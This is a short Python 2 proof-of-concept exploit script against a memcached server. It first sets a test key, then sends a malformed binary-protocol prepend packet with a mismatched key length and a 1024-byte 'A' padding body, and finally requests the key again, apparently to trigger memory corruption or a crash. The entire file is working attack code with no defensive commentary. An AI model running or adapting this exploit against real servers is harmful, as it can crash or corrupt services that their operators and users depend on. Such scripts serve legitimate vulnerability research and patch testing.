import struct
import socket
import sys

MEMCACHED_REQUEST_MAGIC = "\x80"
OPCODE_PREPEND_Q = "\x1a"
key_len = struct.pack("!H",0xfa)
extra_len = "\x00"
data_type = "\x00"
vbucket = "\x00\x00"
body_len = struct.pack("!I",0)
opaque = struct.pack("!I",0)
CAS = struct.pack("!Q",0)
body = "A"*1024

if len(sys.argv) != 3:
        print "./poc_20160874.py <server> <port>"

packet = MEMCACHED_REQUEST_MAGIC + OPCODE_PREPEND_Q + key_len + extra_len
packet += data_type + vbucket + body_len + opaque + CAS
packet += body

set_packet = "set testkey 0 60 4\r\ntest\r\n"
get_packet = "get testkey\r\n"

s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s1.connect((sys.argv[1],int(sys.argv[2])))
s1.sendall(set_packet)
print s1.recv(1024)
s1.close()


s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s2.connect((sys.argv[1],int(sys.argv[2])))
s2.sendall(packet)
print s2.recv(1024)
s2.close()

s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s3.connect((sys.argv[1],int(sys.argv[2])))
s3.sendall(get_packet)
s3.recv(1024)
s3.close()